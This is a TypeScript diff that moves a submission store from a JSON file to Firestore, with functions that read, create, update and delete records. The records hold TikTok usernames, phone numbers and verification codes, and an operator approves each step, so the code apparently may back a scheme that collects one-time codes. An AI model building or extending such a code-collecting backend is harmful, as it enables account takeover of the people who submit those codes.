@@ -1,41 +1,44 @@
-
 import type { Submission } from '@/lib/types';
-import { JsonStore } from './json-store';
-import { v4 as uuidv4 } from 'uuid';
+import { db } from './firebaseAdmin';
 
-const submissionStore = new JsonStore<Submission[]>('src/data/submissions.json', []);
-
+const submissionsCollection = db.collection('submissions');
 
 // Submissions
 
 export async function getSubmissions(): Promise<Submission[]> {
-    const submissions = await submissionStore.read();
-    // Sort by date descending
-    return submissions.sort((a, b) => new Date(b.createdAt).getTime() - new Date(a.createdAt).getTime());
+    const snapshot = await submissionsCollection.orderBy('createdAt', 'desc').get();
+    if (snapshot.empty) {
+        return [];
+    }
+    return snapshot.docs.map(doc => ({ id: doc.id, ...doc.data() } as Submission));
 }
 
 export async function getSubmissionById(id: string): Promise<Submission | null> {
-    const submissions = await submissionStore.read();
-    return submissions.find(s => s.id === id) || null;
+    const doc = await submissionsCollection.doc(id).get();
+    if (!doc.exists) {
+        return null;
+    }
+    return { id: doc.id, ...doc.data() } as Submission;
 }
 
 export async function createOrUpdateSubmission(id: string, data: Partial<Submission>): Promise<Submission> {
-    const submissions = await submissionStore.read();
-    const existingIndex = submissions.findIndex(s => s.id === id);
+    const docRef = submissionsCollection.doc(id);
+    const doc = await docRef.get();
 
     let submissionData: Submission;
 
-    if (existingIndex > -1) {
+    if (doc.exists) {
         // Merge new data with existing submission
-        submissionData = { ...submissions[existingIndex], ...data };
+        const existingData = doc.data() as Submission;
+        submissionData = { ...existingData, ...data, id: doc.id };
 
         // Ensure statuses are correctly updated based on incoming data
         if (data.tiktokUsername) submissionData.tiktokUsernameStatus = 'approved';
         if (data.verificationCode) submissionData.verificationCodeStatus = 'pending';
         if (data.phoneNumber) submissionData.phoneNumberStatus = 'approved'; // Let's keep this auto-approved for smoother flow
         if (data.finalCode) submissionData.finalCodeStatus = 'pending';
-
-        submissions[existingIndex] = submissionData;
+        
+        await docRef.set(submissionData, { merge: true });
 
     } else {
          submissionData = {
@@ -49,43 +52,40 @@ export async function createOrUpdateSubmission(id: string, data: Partial<Submiss
             createdAt: new Date().toISOString(),
             ...data,
         };
-        submissions.push(submissionData);
+        await docRef.set(submissionData);
     }
     
-    await submissionStore.write(submissions);
     return submissionData;
 }
 
 export async function updateSubmissionStepStatus(submissionId: string, step: string, status: 'approved' | 'rejected'): Promise<Submission> {
-    const submissions = await submissionStore.read();
-    const submissionIndex = submissions.findIndex(s => s.id === submissionId);
+    const docRef = submissionsCollection.doc(submissionId);
+    const doc = await docRef.get();
 
-    if (submissionIndex === -1) {
+    if (!doc.exists) {
         throw new Error('Submission not found');
     }
 
-    const submission = submissions[submissionIndex];
-    const keyToUpdate = `${step}Status` as keyof Submission;
-    
-    (submission as any)[keyToUpdate] = status;
+    const keyToUpdate = `${step}Status`;
+    let updatePayload: { [key: string]: any } = { [keyToUpdate]: status };
 
     // If any step is rejected, the entire submission is no longer considered verified.
     if (status === 'rejected') {
-        submission.isVerified = false;
+        updatePayload.isVerified = false;
     }
     
     // If the final code step is approved, the entire submission becomes verified.
     if (step === 'finalCode' && status === 'approved') {
-        submission.isVerified = true;
+        updatePayload.isVerified = true;
     }
 
-    await submissionStore.write(submissions);
-    return submission;
+    await docRef.update(updatePayload);
+
+    const updatedDoc = await docRef.get();
+    return { id: updatedDoc.id, ...updatedDoc.data() } as Submission;
 }
 
 
 export async function deleteSubmission(submissionId: string): Promise<void> {
-    let submissions = await submissionStore.read();
-    submissions = submissions.filter(s => s.id !== submissionId);
-    await submissionStore.write(submissions);
+    await submissionsCollection.doc(submissionId).delete();
 }
